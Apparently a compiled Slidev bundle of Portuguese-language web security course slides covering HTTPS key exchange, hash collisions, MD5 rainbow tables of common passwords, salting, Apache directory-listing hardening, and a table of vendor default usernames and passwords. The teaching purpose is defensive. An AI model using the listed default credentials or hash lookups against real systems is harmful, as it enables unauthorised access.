</div>`,title:"Posso utilizar os dois ?",level:1,content:`# Posso utilizar os dois ?

<div>
<Image src="question-guy.png" style="margin:0 auto" />
</div>`,frontmatter:{title:"Posso utilizar os dois ?"},index:0,start:0,end:5},inline:{raw:`---
src: ./slides/20.https.md
layout: center
class: text-center
---
`,content:"",frontmatter:{layout:"center",class:"text-center"},index:16,start:90,end:96},filepath:"/home/tux/Work/crescer/dia-2/slides/20.https.md",notesHTML:"",id:16,no:17},__clicksElements:[],__preloaded:!1}},{path:"18",name:"page-18",component:z5,meta:{title:"HTTP's",srcSequence:"./slides/21.https.md",slide:{raw:null,title:"HTTP's",level:1,content:`# HTTP's

<br>
<div grid="~ cols-3">
  <div class="text-center">
    <Image :src="'/firefox-logo.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Browser</span>
  </div>
  <div style="margin-top:10px" class="text-center">
    <Image :src="'/hacker.png'" :style="'width:100px;height:100px;margin: 0 auto'" />
    <span style="color:red">Man In The Middle</span>
  </div>
  <div class="text-center">
    <Image :src="'/server-icon.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Servidor</span>
  </div>
</div>


<arrow x1="260" y1="160" x2="430" y2="160" color="#ccc" width="3" arrowSize="1" />
<arrow x1="560" y1="160" x2="720" y2="160" color="#ccc" width="3" arrowSize="1" />

<arrow x1="430" y1="210" x2="260" y2="210" color="#ccc" width="3" arrowSize="1" />
<arrow x1="720" y1="210" x2="560" y2="210" color="#ccc" width="3" arrowSize="1" />
<br>

<div v-click>

1. Browser solicita chave p\xFAblica para o servidor.
2. Servidor entrega chave p\xFAblica para o browser.
3. Browser gera uma chave aleat\xF3ria e criptografa com a chave p\xFAblica do servidor.
4. A chave gerada e criptografada \xE9 enviada para o servidor.
5. Servidor descriptografa utilizando a chave privada.
6. Comunica\xE7\xE3o para a ser utilizando apenas a chave aleat\xF3ria gerada.
</div>`,frontmatter:{title:"HTTP's",srcSequence:"./slides/21.https.md"},index:17,start:0,end:35,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/21.https.md",raw:`# HTTP's

<br>
<div grid="~ cols-3">
  <div class="text-center">
    <Image :src="'/firefox-logo.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Browser</span>
  </div>
  <div style="margin-top:10px" class="text-center">
    <Image :src="'/hacker.png'" :style="'width:100px;height:100px;margin: 0 auto'" />
    <span style="color:red">Man In The Middle</span>
  </div>
  <div class="text-center">
    <Image :src="'/server-icon.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Servidor</span>
  </div>
</div>


<arrow x1="260" y1="160" x2="430" y2="160" color="#ccc" width="3" arrowSize="1" />
<arrow x1="560" y1="160" x2="720" y2="160" color="#ccc" width="3" arrowSize="1" />

<arrow x1="430" y1="210" x2="260" y2="210" color="#ccc" width="3" arrowSize="1" />
<arrow x1="720" y1="210" x2="560" y2="210" color="#ccc" width="3" arrowSize="1" />
<br>

<div v-click>

1. Browser solicita chave p\xFAblica para o servidor.
2. Servidor entrega chave p\xFAblica para o browser.
3. Browser gera uma chave aleat\xF3ria e criptografa com a chave p\xFAblica do servidor.
4. A chave gerada e criptografada \xE9 enviada para o servidor.
5. Servidor descriptografa utilizando a chave privada.
6. Comunica\xE7\xE3o para a ser utilizando apenas a chave aleat\xF3ria gerada.
</div>`,title:"HTTP's",level:1,content:`# HTTP's

<br>
<div grid="~ cols-3">
  <div class="text-center">
    <Image :src="'/firefox-logo.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Browser</span>
  </div>
  <div style="margin-top:10px" class="text-center">
    <Image :src="'/hacker.png'" :style="'width:100px;height:100px;margin: 0 auto'" />
    <span style="color:red">Man In The Middle</span>
  </div>
  <div class="text-center">
    <Image :src="'/server-icon.png'" :style="'width:100px;height:100px;margin: 0 auto'" :class="'img-hor-vert'" />
    <span>Servidor</span>
  </div>
</div>


<arrow x1="260" y1="160" x2="430" y2="160" color="#ccc" width="3" arrowSize="1" />
<arrow x1="560" y1="160" x2="720" y2="160" color="#ccc" width="3" arrowSize="1" />

<arrow x1="430" y1="210" x2="260" y2="210" color="#ccc" width="3" arrowSize="1" />
<arrow x1="720" y1="210" x2="560" y2="210" color="#ccc" width="3" arrowSize="1" />
<br>

<div v-click>

1. Browser solicita chave p\xFAblica para o servidor.
2. Servidor entrega chave p\xFAblica para o browser.
3. Browser gera uma chave aleat\xF3ria e criptografa com a chave p\xFAblica do servidor.
4. A chave gerada e criptografada \xE9 enviada para o servidor.
5. Servidor descriptografa utilizando a chave privada.
6. Comunica\xE7\xE3o para a ser utilizando apenas a chave aleat\xF3ria gerada.
</div>`,frontmatter:{title:"HTTP's"},index:0,start:0,end:35},inline:{raw:`---
src: ./slides/21.https.md
---
`,content:"",frontmatter:{},index:17,start:96,end:100},filepath:"/home/tux/Work/crescer/dia-2/slides/21.https.md",notesHTML:"",id:17,no:18},__clicksElements:[],__preloaded:!1}},{path:"19",name:"page-19",component:U5,meta:{title:"Um poucos mais sobre hashes...",layout:"center",class:"text-center",srcSequence:"./slides/30.hash.md",slide:{raw:null,title:"Um poucos mais sobre hashes...",level:1,content:"# Um poucos mais sobre hashes...",frontmatter:{title:"Um poucos mais sobre hashes...",layout:"center",class:"text-center",srcSequence:"./slides/30.hash.md"},index:18,start:0,end:1,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/30.hash.md",raw:"# Um poucos mais sobre hashes...",title:"Um poucos mais sobre hashes...",level:1,content:"# Um poucos mais sobre hashes...",frontmatter:{title:"Um poucos mais sobre hashes..."},index:0,start:0,end:1},inline:{raw:`---
src: ./slides/30.hash.md
layout: center
class: text-center
---
`,content:"",frontmatter:{layout:"center",class:"text-center"},index:18,start:100,end:106},filepath:"/home/tux/Work/crescer/dia-2/slides/30.hash.md",notesHTML:"",id:18,no:19},__clicksElements:[],__preloaded:!1}},{path:"20",name:"page-20",component:g2,meta:{title:"Colis\xE3o de HASH",clicks:3,srcSequence:"./slides/31.hash.md",slide:{raw:null,title:"Colis\xE3o de HASH",level:1,content:`# Colis\xE3o de HASH

Duas entradas diferentes acabam gerando a mesma sa\xEDda.

<div grid="~ cols-2 gap-4" style="margin-top:80px">

  <div style="text-align: center">
    <span v-click="1">98318-0209</span><br><br>
    <span v-click="2">983 + 180 + 209</span>
  </div>

  <div style="text-align: center">
    <span v-click="1">99029-8084</span><br><br>
    <span v-click="2">990 + 298 + 084</span>
  </div>
  
</div>
<br><br><br><br>
<div v-click="3" style="text-align:center;color:red;font-weight:bold">
  <span>1372</span>
</div>

<arrow v-click="3" x1="300" y1="290" x2="460" y2="370" color="#F00" width="3" arrowSize="1" />
<arrow v-click="3" x1="680" y1="290" x2="520" y2="370" color="#F00" width="3" arrowSize="1" />`,frontmatter:{title:"Colis\xE3o de HASH",clicks:3,srcSequence:"./slides/31.hash.md"},index:19,start:0,end:24,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/31.hash.md",raw:`# Colis\xE3o de HASH

Duas entradas diferentes acabam gerando a mesma sa\xEDda.

<div grid="~ cols-2 gap-4" style="margin-top:80px">

  <div style="text-align: center">
    <span v-click="1">98318-0209</span><br><br>
    <span v-click="2">983 + 180 + 209</span>
  </div>

  <div style="text-align: center">
    <span v-click="1">99029-8084</span><br><br>
    <span v-click="2">990 + 298 + 084</span>
  </div>
  
</div>
<br><br><br><br>
<div v-click="3" style="text-align:center;color:red;font-weight:bold">
  <span>1372</span>
</div>

<arrow v-click="3" x1="300" y1="290" x2="460" y2="370" color="#F00" width="3" arrowSize="1" />
<arrow v-click="3" x1="680" y1="290" x2="520" y2="370" color="#F00" width="3" arrowSize="1" />`,title:"Colis\xE3o de HASH",level:1,content:`# Colis\xE3o de HASH

Duas entradas diferentes acabam gerando a mesma sa\xEDda.

<div grid="~ cols-2 gap-4" style="margin-top:80px">

  <div style="text-align: center">
    <span v-click="1">98318-0209</span><br><br>
    <span v-click="2">983 + 180 + 209</span>
  </div>

  <div style="text-align: center">
    <span v-click="1">99029-8084</span><br><br>
    <span v-click="2">990 + 298 + 084</span>
  </div>
  
</div>
<br><br><br><br>
<div v-click="3" style="text-align:center;color:red;font-weight:bold">
  <span>1372</span>
</div>

<arrow v-click="3" x1="300" y1="290" x2="460" y2="370" color="#F00" width="3" arrowSize="1" />
<arrow v-click="3" x1="680" y1="290" x2="520" y2="370" color="#F00" width="3" arrowSize="1" />`,frontmatter:{title:"Colis\xE3o de HASH"},index:0,start:0,end:24},inline:{raw:`---
src: ./slides/31.hash.md
clicks: 3
---
`,content:"",frontmatter:{clicks:3},index:19,start:106,end:111},filepath:"/home/tux/Work/crescer/dia-2/slides/31.hash.md",notesHTML:"",id:19,no:20},__clicksElements:[],__preloaded:!1}},{path:"21",name:"page-21",component:A2,meta:{title:"Rainbow table",srcSequence:"./slides/32.hash.md",slide:{raw:null,title:"Rainbow table",level:1,content:`<style>
.slidev-layout td, .slidev-layout th {
    padding: 2px !important;
    border-left: solid 1px #666;
    text-align: center;
    font-size: 14px;
}
.slidev-layout table {
  margin-left: 20px;
}
</style>
# Rainbow table

Hashes pr\xE9-processados

<div grid="~ cols-2">
  <div style="text-align:center" v-click>
    <Image src="hacker.png" style="width:100px;margin:0 auto;margin-top:80px" />
    <span style="font-size:14px">f25a2fc72690b780b2a14e140ef6a9e0</span>
  </div>
<div v-click="3">

|Id|Senha|Hash|
|-|-|-|
|1|123456 | e10adc3949ba59abbe56e057f20f883e  |
|2|12345 | 827ccb0eea8a706c4c34a16891f84e7b  |
|3|123456789 | 25f9e794323b453885f5181f1b624d0b  |
|4|password | 5f4dcc3b5aa765d61d8327deb882cf99  |
|5|iloveyou | f25a2fc72690b780b2a14e140ef6a9e0  |
|6|princess | 8afa847f50a716e64932d995c8e7435a  |
|7|1234567 | fcea920f7412b5da7be0cf42b8c93759  |
|8|12345678 | 25d55ad283aa400af464c76d713c07ad  |
|9|abc123 | e99a18c428cb38d5f260853678922e03  |
|10|nicole | fc63f87c08d505264caba37514cd0cfd  |
|11|daniel | aa47f8215c6f30a0dcdb2a36a9f4168e  |
|12|babygirl | 67881381dbc68d4761230131ae0008f7 |
</div>
</div>

<arrow v-click="2" x1="330" y1="270" x2="490" y2="270" color="#ccc" width="3" arrowSize="1" />`,frontmatter:{title:"Rainbow table",srcSequence:"./slides/32.hash.md"},index:20,start:0,end:40,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/32.hash.md",raw:`<style>
.slidev-layout td, .slidev-layout th {
    padding: 2px !important;
    border-left: solid 1px #666;
    text-align: center;
    font-size: 14px;
}
.slidev-layout table {
  margin-left: 20px;
}
</style>
# Rainbow table

Hashes pr\xE9-processados

<div grid="~ cols-2">
  <div style="text-align:center" v-click>
    <Image src="hacker.png" style="width:100px;margin:0 auto;margin-top:80px" />
    <span style="font-size:14px">f25a2fc72690b780b2a14e140ef6a9e0</span>
  </div>
<div v-click="3">

|Id|Senha|Hash|
|-|-|-|
|1|123456 | e10adc3949ba59abbe56e057f20f883e  |
|2|12345 | 827ccb0eea8a706c4c34a16891f84e7b  |
|3|123456789 | 25f9e794323b453885f5181f1b624d0b  |
|4|password | 5f4dcc3b5aa765d61d8327deb882cf99  |
|5|iloveyou | f25a2fc72690b780b2a14e140ef6a9e0  |
|6|princess | 8afa847f50a716e64932d995c8e7435a  |
|7|1234567 | fcea920f7412b5da7be0cf42b8c93759  |
|8|12345678 | 25d55ad283aa400af464c76d713c07ad  |
|9|abc123 | e99a18c428cb38d5f260853678922e03  |
|10|nicole | fc63f87c08d505264caba37514cd0cfd  |
|11|daniel | aa47f8215c6f30a0dcdb2a36a9f4168e  |
|12|babygirl | 67881381dbc68d4761230131ae0008f7 |
</div>
</div>

<arrow v-click="2" x1="330" y1="270" x2="490" y2="270" color="#ccc" width="3" arrowSize="1" />`,title:"Rainbow table",level:1,content:`<style>
.slidev-layout td, .slidev-layout th {
    padding: 2px !important;
    border-left: solid 1px #666;
    text-align: center;
    font-size: 14px;
}
.slidev-layout table {
  margin-left: 20px;
}
</style>
# Rainbow table

Hashes pr\xE9-processados

<div grid="~ cols-2">
  <div style="text-align:center" v-click>
    <Image src="hacker.png" style="width:100px;margin:0 auto;margin-top:80px" />
    <span style="font-size:14px">f25a2fc72690b780b2a14e140ef6a9e0</span>
  </div>
<div v-click="3">

|Id|Senha|Hash|
|-|-|-|
|1|123456 | e10adc3949ba59abbe56e057f20f883e  |
|2|12345 | 827ccb0eea8a706c4c34a16891f84e7b  |
|3|123456789 | 25f9e794323b453885f5181f1b624d0b  |
|4|password | 5f4dcc3b5aa765d61d8327deb882cf99  |
|5|iloveyou | f25a2fc72690b780b2a14e140ef6a9e0  |
|6|princess | 8afa847f50a716e64932d995c8e7435a  |
|7|1234567 | fcea920f7412b5da7be0cf42b8c93759  |
|8|12345678 | 25d55ad283aa400af464c76d713c07ad  |
|9|abc123 | e99a18c428cb38d5f260853678922e03  |
|10|nicole | fc63f87c08d505264caba37514cd0cfd  |
|11|daniel | aa47f8215c6f30a0dcdb2a36a9f4168e  |
|12|babygirl | 67881381dbc68d4761230131ae0008f7 |
</div>
</div>

<arrow v-click="2" x1="330" y1="270" x2="490" y2="270" color="#ccc" width="3" arrowSize="1" />`,frontmatter:{title:"Rainbow table"},index:0,start:0,end:40},inline:{raw:`---
src: ./slides/32.hash.md
---
`,content:"",frontmatter:{},index:20,start:111,end:115},filepath:"/home/tux/Work/crescer/dia-2/slides/32.hash.md",notesHTML:"",id:20,no:21},__clicksElements:[],__preloaded:!1}},{path:"22",name:"page-22",component:k2,meta:{title:"Rainbow table online",srcSequence:"./slides/33.hash.md",slide:{raw:null,title:"Rainbow table online",level:1,content:`# Rainbow table online

<div>
  <Image style="border-radius: 10px;margin:0 auto;width:800px;margin-top:40px" src="rainbow-tables.png" />
</div>`,frontmatter:{title:"Rainbow table online",srcSequence:"./slides/33.hash.md"},index:21,start:0,end:5,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/33.hash.md",raw:`# Rainbow table online

<div>
  <Image style="border-radius: 10px;margin:0 auto;width:800px;margin-top:40px" src="rainbow-tables.png" />
</div>`,title:"Rainbow table online",level:1,content:`# Rainbow table online

<div>
  <Image style="border-radius: 10px;margin:0 auto;width:800px;margin-top:40px" src="rainbow-tables.png" />
</div>`,frontmatter:{title:"Rainbow table online"},index:0,start:0,end:5},inline:{raw:`---
src: ./slides/33.hash.md
---
`,content:"",frontmatter:{},index:21,start:115,end:119},filepath:"/home/tux/Work/crescer/dia-2/slides/33.hash.md",notesHTML:"",id:21,no:22},__clicksElements:[],__preloaded:!1}},{path:"23",name:"page-23",component:M2,meta:{title:"Salt de senha",srcSequence:"./slides/34.hash.md",slide:{raw:null,title:"Salt de senha",level:1,content:`<style>
.slidev-layout td, .slidev-layout th {
    padding: 2px !important;
    border-left: solid 1px #666;
    text-align: center;
    font-size: 14px;
}
.slidev-layout table {
  margin-left: 20px;
}
</style>
# Salt de senha

Adi\xE7\xE3o de um complemento na senha.

<div grid="~ cols-2">
  <div v-click style="text-align:center">
    <Image src="hacker.png" style="width:100px;margin:0 auto;margin-top:80px" />
    <span style="font-size:14px">iloveyou + salt</span><br>
    <span style="font-size:14px">38d72b8e1c8fb24e1adc392f842f2051</span>
  </div>
<div v-click="2">

|Id|Senha|Hash|
|-|-|-|
|1|123456 | e10adc3949ba59abbe56e057f20f883e  |
|2|12345 | 827ccb0eea8a706c4c34a16891f84e7b  |
|3|123456789 | 25f9e794323b453885f5181f1b624d0b  |
|4|password | 5f4dcc3b5aa765d61d8327deb882cf99  |
|5|iloveyou | f25a2fc72690b780b2a14e140ef6a9e0  |
|6|princess | 8afa847f50a716e64932d995c8e7435a  |
|7|1234567 | fcea920f7412b5da7be0cf42b8c93759  |
|8|12345678 | 25d55ad283aa400af464c76d713c07ad  |
|9|abc123 | e99a18c428cb38d5f260853678922e03  |
|10|nicole | fc63f87c08d505264caba37514cd0cfd  |
|11|daniel | aa47f8215c6f30a0dcdb2a36a9f4168e  |
|12|babygirl | 67881381dbc68d4761230131ae0008f7 |
</div>
</div>

<arrow v-click="2" x1="330" y1="270" x2="490" y2="270" color="#ccc" width="2" arrowSize="1" />`,frontmatter:{title:"Salt de senha",srcSequence:"./slides/34.hash.md"},index:22,start:0,end:41,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/34.hash.md",raw:`<style>
.slidev-layout td, .slidev-layout th {
    padding: 2px !important;
    border-left: solid 1px #666;
    text-align: center;
    font-size: 14px;
}
.slidev-layout table {
  margin-left: 20px;
}
</style>
# Salt de senha

Adi\xE7\xE3o de um complemento na senha.

<div grid="~ cols-2">
  <div v-click style="text-align:center">
    <Image src="hacker.png" style="width:100px;margin:0 auto;margin-top:80px" />
    <span style="font-size:14px">iloveyou + salt</span><br>
    <span style="font-size:14px">38d72b8e1c8fb24e1adc392f842f2051</span>
  </div>
<div v-click="2">

|Id|Senha|Hash|
|-|-|-|
|1|123456 | e10adc3949ba59abbe56e057f20f883e  |
|2|12345 | 827ccb0eea8a706c4c34a16891f84e7b  |
|3|123456789 | 25f9e794323b453885f5181f1b624d0b  |
|4|password | 5f4dcc3b5aa765d61d8327deb882cf99  |
|5|iloveyou | f25a2fc72690b780b2a14e140ef6a9e0  |
|6|princess | 8afa847f50a716e64932d995c8e7435a  |
|7|1234567 | fcea920f7412b5da7be0cf42b8c93759  |
|8|12345678 | 25d55ad283aa400af464c76d713c07ad  |
|9|abc123 | e99a18c428cb38d5f260853678922e03  |
|10|nicole | fc63f87c08d505264caba37514cd0cfd  |
|11|daniel | aa47f8215c6f30a0dcdb2a36a9f4168e  |
|12|babygirl | 67881381dbc68d4761230131ae0008f7 |
</div>
</div>

<arrow v-click="2" x1="330" y1="270" x2="490" y2="270" color="#ccc" width="2" arrowSize="1" />`,title:"Salt de senha",level:1,content:`<style>
.slidev-layout td, .slidev-layout th {
    padding: 2px !important;
    border-left: solid 1px #666;
    text-align: center;
    font-size: 14px;
}
.slidev-layout table {
  margin-left: 20px;
}
</style>
# Salt de senha

Adi\xE7\xE3o de um complemento na senha.

<div grid="~ cols-2">
  <div v-click style="text-align:center">
    <Image src="hacker.png" style="width:100px;margin:0 auto;margin-top:80px" />
    <span style="font-size:14px">iloveyou + salt</span><br>
    <span style="font-size:14px">38d72b8e1c8fb24e1adc392f842f2051</span>
  </div>
<div v-click="2">

|Id|Senha|Hash|
|-|-|-|
|1|123456 | e10adc3949ba59abbe56e057f20f883e  |
|2|12345 | 827ccb0eea8a706c4c34a16891f84e7b  |
|3|123456789 | 25f9e794323b453885f5181f1b624d0b  |
|4|password | 5f4dcc3b5aa765d61d8327deb882cf99  |
|5|iloveyou | f25a2fc72690b780b2a14e140ef6a9e0  |
|6|princess | 8afa847f50a716e64932d995c8e7435a  |
|7|1234567 | fcea920f7412b5da7be0cf42b8c93759  |
|8|12345678 | 25d55ad283aa400af464c76d713c07ad  |
|9|abc123 | e99a18c428cb38d5f260853678922e03  |
|10|nicole | fc63f87c08d505264caba37514cd0cfd  |
|11|daniel | aa47f8215c6f30a0dcdb2a36a9f4168e  |
|12|babygirl | 67881381dbc68d4761230131ae0008f7 |
</div>
</div>

<arrow v-click="2" x1="330" y1="270" x2="490" y2="270" color="#ccc" width="2" arrowSize="1" />`,frontmatter:{title:"Salt de senha"},index:0,start:0,end:41},inline:{raw:`---
src: ./slides/34.hash.md
---
`,content:"",frontmatter:{},index:22,start:119,end:123},filepath:"/home/tux/Work/crescer/dia-2/slides/34.hash.md",notesHTML:"",id:22,no:23},__clicksElements:[],__preloaded:!1}},{path:"24",name:"page-24",component:q2,meta:{title:"Dicas",srcSequence:"./slides/35.hash.md",slide:{raw:null,title:"Dicas",level:1,content:`# Dicas

Utilizar algoritmos de hash conhecidos por serem seguros.

- Bcrypt
- Scrypt
- Argon2`,frontmatter:{title:"Dicas",srcSequence:"./slides/35.hash.md"},index:23,start:0,end:7,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/35.hash.md",raw:`# Dicas

Utilizar algoritmos de hash conhecidos por serem seguros.

- Bcrypt
- Scrypt
- Argon2`,title:"Dicas",level:1,content:`# Dicas

Utilizar algoritmos de hash conhecidos por serem seguros.

- Bcrypt
- Scrypt
- Argon2`,frontmatter:{title:"Dicas"},index:0,start:0,end:7},inline:{raw:`---
src: ./slides/35.hash.md
---
`,content:"",frontmatter:{},index:23,start:123,end:127},filepath:"/home/tux/Work/crescer/dia-2/slides/35.hash.md",notesHTML:"",id:23,no:24},__clicksElements:[],__preloaded:!1}},{path:"25",name:"page-25",component:H2,meta:{title:"Pr\xE1tica com Bcrypt",layout:"center",class:"text-center",srcSequence:"./slides/36.hash.md",slide:{raw:null,title:"Pr\xE1tica com Bcrypt",level:1,content:"# Pr\xE1tica com Bcrypt",frontmatter:{title:"Pr\xE1tica com Bcrypt",layout:"center",class:"text-center",srcSequence:"./slides/36.hash.md"},index:24,start:0,end:1,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/36.hash.md",raw:"# Pr\xE1tica com Bcrypt",title:"Pr\xE1tica com Bcrypt",level:1,content:"# Pr\xE1tica com Bcrypt",frontmatter:{title:"Pr\xE1tica com Bcrypt"},index:0,start:0,end:1},inline:{raw:`---
src: ./slides/36.hash.md
layout: center
class: text-center
---
`,content:"",frontmatter:{layout:"center",class:"text-center"},index:24,start:127,end:133},filepath:"/home/tux/Work/crescer/dia-2/slides/36.hash.md",notesHTML:"",id:24,no:25},__clicksElements:[],__preloaded:!1}},{path:"26",name:"page-26",component:V2,meta:{title:"Configura\xE7\xE3o padr\xE3o ou insegura",layout:"center",class:"text-center",srcSequence:"./slides/40.security-misconfiguration.md",slide:{raw:null,title:"Configura\xE7\xE3o padr\xE3o ou insegura",level:1,content:"# Configura\xE7\xE3o padr\xE3o ou insegura",frontmatter:{title:"Configura\xE7\xE3o padr\xE3o ou insegura",layout:"center",class:"text-center",srcSequence:"./slides/40.security-misconfiguration.md"},index:25,start:0,end:1,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/40.security-misconfiguration.md",raw:"# Configura\xE7\xE3o padr\xE3o ou insegura",title:"Configura\xE7\xE3o padr\xE3o ou insegura",level:1,content:"# Configura\xE7\xE3o padr\xE3o ou insegura",frontmatter:{title:"Configura\xE7\xE3o padr\xE3o ou insegura"},index:0,start:0,end:1},inline:{raw:`---
src: ./slides/40.security-misconfiguration.md
layout: center
class: text-center
---
`,content:"",frontmatter:{layout:"center",class:"text-center"},index:25,start:133,end:139},filepath:"/home/tux/Work/crescer/dia-2/slides/40.security-misconfiguration.md",notesHTML:"",id:25,no:26},__clicksElements:[],__preloaded:!1}},{path:"27",name:"page-27",component:J2,meta:{title:"Listagem de diret\xF3rios",srcSequence:"./slides/41.security-misconfiguration.md",slide:{raw:null,title:"Listagem de diret\xF3rios",level:1,content:`# Listagem de diret\xF3rios

<div grid="~ cols-2">
  <div>
    <div>
      <Image v-click src="google-hacking.png" style="border-radius:10px;transition: 500ms" width="350" />
    </div>
    <br>
    <div>
      <Image v-click src="directory-list.png" style="border-radius:10px" width="350" />
    </div>
  </div>
  <div v-click>

###### Padr\xE3o do Apache2:
\`\`\`xml
<Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
\`\`\`
<br>

###### Recomenda\xE7\xE3o:
\`\`\`xml {2}
<Directory /var/www/>
        Options -Indexes -FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
\`\`\`

</div>
</div>`,frontmatter:{title:"Listagem de diret\xF3rios",srcSequence:"./slides/41.security-misconfiguration.md"},index:26,start:0,end:35,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/41.security-misconfiguration.md",raw:`# Listagem de diret\xF3rios

<div grid="~ cols-2">
  <div>
    <div>
      <Image v-click src="google-hacking.png" style="border-radius:10px;transition: 500ms" width="350" />
    </div>
    <br>
    <div>
      <Image v-click src="directory-list.png" style="border-radius:10px" width="350" />
    </div>
  </div>
  <div v-click>

###### Padr\xE3o do Apache2:
\`\`\`xml
<Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
\`\`\`
<br>

###### Recomenda\xE7\xE3o:
\`\`\`xml {2}
<Directory /var/www/>
        Options -Indexes -FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
\`\`\`

</div>
</div>`,title:"Listagem de diret\xF3rios",level:1,content:`# Listagem de diret\xF3rios

<div grid="~ cols-2">
  <div>
    <div>
      <Image v-click src="google-hacking.png" style="border-radius:10px;transition: 500ms" width="350" />
    </div>
    <br>
    <div>
      <Image v-click src="directory-list.png" style="border-radius:10px" width="350" />
    </div>
  </div>
  <div v-click>

###### Padr\xE3o do Apache2:
\`\`\`xml
<Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
\`\`\`
<br>

###### Recomenda\xE7\xE3o:
\`\`\`xml {2}
<Directory /var/www/>
        Options -Indexes -FollowSymLinks
        AllowOverride None
        Require all granted
</Directory>
\`\`\`

</div>
</div>`,frontmatter:{title:"Listagem de diret\xF3rios"},index:0,start:0,end:35},inline:{raw:`---
src: ./slides/41.security-misconfiguration.md
---
`,content:"",frontmatter:{},index:26,start:139,end:143},filepath:"/home/tux/Work/crescer/dia-2/slides/41.security-misconfiguration.md",notesHTML:"",id:26,no:27},__clicksElements:[],__preloaded:!1}},{path:"28",name:"page-28",component:nx,meta:{title:"Storage de Armazenamentos",srcSequence:"./slides/42.security-misconfiguration.md",slide:{raw:null,title:"Storage de Armazenamentos",level:1,content:`# Storage de Armazenamentos

- Simple Storage Service (S3) - Amazon
- Firebase Storage - Google`,frontmatter:{title:"Storage de Armazenamentos",srcSequence:"./slides/42.security-misconfiguration.md"},index:27,start:0,end:4,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/42.security-misconfiguration.md",raw:`# Storage de Armazenamentos

- Simple Storage Service (S3) - Amazon
- Firebase Storage - Google`,title:"Storage de Armazenamentos",level:1,content:`# Storage de Armazenamentos

- Simple Storage Service (S3) - Amazon
- Firebase Storage - Google`,frontmatter:{title:"Storage de Armazenamentos"},index:0,start:0,end:4},inline:{raw:`---
src: ./slides/42.security-misconfiguration.md
---
`,content:"",frontmatter:{},index:27,start:143,end:147},filepath:"/home/tux/Work/crescer/dia-2/slides/42.security-misconfiguration.md",notesHTML:"",id:27,no:28},__clicksElements:[],__preloaded:!1}},{path:"29",name:"page-29",component:px,meta:{title:"Usu\xE1rio e senha padr\xE3o",srcSequence:"./slides/43.security-misconfiguration.md",slide:{raw:null,title:"Usu\xE1rio e senha padr\xE3o",level:1,content:`<style>
  .pass-default-table th,.pass-default-table td {
    padding: 4px !important;
    font-size: 10px;
  }
</style>
# Usu\xE1rio e senha padr\xE3o

<div grid="~ cols-2">

<div>
  <Image v-click src="shodan.png" style="border-radius:10px;transition: 500ms" width="400" />
</div>

<div v-click class="pass-default-table" style="transition: 500ms">

|**App**|**Usu\xE1rio**|**Senha**|
|-|-|-|
|Apache Tomcat|admin|admin|
|Apache Tomcat|admin|j5Brn9|
|Gitlab|admin|5iveL|
|Gitlab|admin|5iveL!fe|
|Gitlab|root|5iveL!fe|
|MSSQL|sa|BLANK|
|MSSQL|sa|sa|
|MSSQL|sa|password|
|MSSQL|sa|Password123|
|MySQL|root|BLANK|
|MySQL|superdba|admin|
|SonarQube|admin|admin|
|SonicWALL|admin|password|

</div>
</div>

<arrow v-click x1="950" y1="360" x2="830" y2="395" color="#F00" width="3" arrowSize="1" style="transition: 500ms" />
<br>
<div v-click>

###### Fonte das credenciais:
###### https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv

</div>`,frontmatter:{title:"Usu\xE1rio e senha padr\xE3o",srcSequence:"./slides/43.security-misconfiguration.md"},index:28,start:0,end:43,source:{filepath:"/home/tux/Work/crescer/dia-2/slides/43.security-misconfiguration.md",raw:`<style>
  .pass-default-table th,.pass-default-table td {
    padding: 4px !important;
    font-size: 10px;
  }
</style>
# Usu\xE1rio e senha padr\xE3o

<div grid="~ cols-2">

<div>
  <Image v-click src="shodan.png" style="border-radius:10px;transition: 500ms" width="400" />
</div>

<div v-click class="pass-default-table" style="transition: 500ms">

|**App**|**Usu\xE1rio**|**Senha**|
|-|-|-|
|Apache Tomcat|admin|admin|
|Apache Tomcat|admin|j5Brn9|
|Gitlab|admin|5iveL|
|Gitlab|admin|5iveL!fe|
|Gitlab|root|5iveL!fe|
|MSSQL|sa|BLANK|
|MSSQL|sa|sa|
|MSSQL|sa|password|
|MSSQL|sa|Password123|
|MySQL|root|BLANK|
|MySQL|superdba|admin|
|SonarQube|admin|admin|
|SonicWALL|admin|password|

</div>
</div>

<arrow v-click x1="950" y1="360" x2="830" y2="395" color="#F00" width="3" arrowSize="1" style="transition: 500ms" />
<br>
<div v-click>

###### Fonte das credenciais:
###### https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv

</div>`,title:"Usu\xE1rio e senha padr\xE3o",level:1,content:`<style>
  .pass-default-table th,.pass-default-table td {
    padding: 4px !important;
    font-size: 10px;
  }
</style>
# Usu\xE1rio e senha padr\xE3o

<div grid="~ cols-2">

<div>
  <Image v-click src="shodan.png" style="border-radius:10px;transition: 500ms" width="400" />
</div>

<div v-click class="pass-default-table" style="transition: 500ms">

|**App**|**Usu\xE1rio**|**Senha**|
|-|-|-|
|Apache Tomcat|admin|admin|
|Apache Tomcat|admin|j5Brn9|
|Gitlab|admin|5iveL|
|Gitlab|admin|5iveL!fe|
|Gitlab|root|5iveL!fe|
